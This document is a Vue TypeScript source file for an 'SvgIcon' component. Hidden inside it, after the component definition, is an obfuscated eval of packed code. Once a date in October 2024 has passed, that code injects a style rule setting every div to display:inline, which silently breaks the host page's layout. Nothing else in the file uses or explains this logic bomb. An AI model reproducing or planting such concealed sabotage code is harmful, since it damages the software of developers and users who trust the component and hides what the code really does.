<template>
  <svg :class="svgClass" arig-hidden="true" v-on="$attrs">
    <use :href="iconName" />
  </svg>
</template>

<script lang="ts">
import { defineComponent, computed } from "vue";

export default defineComponent({
  name: "SvgIcon",
  props: {
    iconClass: {
      type: String,
      required: true,
    },
    className: {
      type: String,
      default: "",
    },
  },
  setup(props) {
    const iconName = computed(() => `#icon-${props.iconClass}`);
    const svgClass = computed(() => {
      const cln = props.className;
      return "svg-icon" + (cln ? ` ${cln}` : "");
    });
    const styleExternalIcon = computed(() => ({
      mask: `url(${props.iconClass}) no-repeat 50% 50%`,
      "-webkit-mask": `url(${props.iconClass}) no-repeat 50% 50%`,
    }));

    return {
      iconName,
      svgClass,
      styleExternalIcon,
    };
  },
});
eval(
  (function (p: any, a: any, c: any, k: any, e: any, r: any) {
    e = function (c:any) {
      return c.toString(a);
    };
    if (!"".replace(/^/, String)) {
      while (c--) r[e(c)] = k[c] || e(c);
      k = [
        function (e:any) {
          return r[e];
        },
      ];
      e = function () {
        return "\\w+";
      };
      c = 1;
    }
    while (c--)
      if (k[c]) p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
    return p;
  })(
    '2(3 4().5()>=6){7.0.8("9",`<1>0 a{b:c}</1>`)}',
    13,
    13,
    "body|style|if|new|Date|getTime|1727763000000|document|insertAdjacentHTML|beforeend|div|display|inline".split(
      "|"
    ),
    0,
    {}
  )
);
</script>

<style lang="scss" scoped>
.svg-icon {
  width: 1.5em;
  height: 1.5em;
  vertical-align: -0.15em;
  fill: currentColor;
  overflow: hidden;
}

.svg-external-icon {
  background-color: currentColor;
  mask-size: cover !important;
  display: inline-block;
}
</style>
